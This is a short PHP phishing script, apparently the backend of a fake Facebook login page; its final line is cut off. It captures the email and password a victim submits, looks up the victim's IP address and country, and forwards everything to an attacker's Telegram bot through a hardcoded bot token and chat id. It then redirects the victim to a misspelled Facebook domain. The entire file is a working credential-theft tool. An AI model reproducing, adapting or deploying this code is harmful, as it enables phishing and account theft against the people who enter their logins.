<?php
header ('Location: https://facbook.com/ ');
$API_KEY = "1799452510:AAEk7drd0ZPGQqcLFFBzawPB3ZNS12eWDZ4";
?>
<?php
 $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
 $api = json_decode(file_get_contents("https://ipinfo.io/$ip"));
 $city = $api->city;
 $countryfromip = $api->country; 
$admin = 1173831158; 
$user = $_POST["medo"];
$pass = $_POST["MEDO"];
$login = $_POST["login"];
$tier = $_POST["tier"];
$phone = $_POST['phone'];
$text = urlencode("
     𖦹 INDEX 𖦹  
━━━━━━━━━━━━
ᯓ ᴇᴍᴀɪʟ 𓂅  $user  𓍯
ᯓ ᴘᴀssᴡᴏʀᴅ 𓂅  $pass 𓍯
ᯓ ᴄᴏᴜɴᴛʀʏ 𓂅  $countryfromip  𓍯
ᯓ ip 𓂅  $ip  𓍯 
━━━━━━━━━━━━
 - ʙʏ :- @S33333
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url

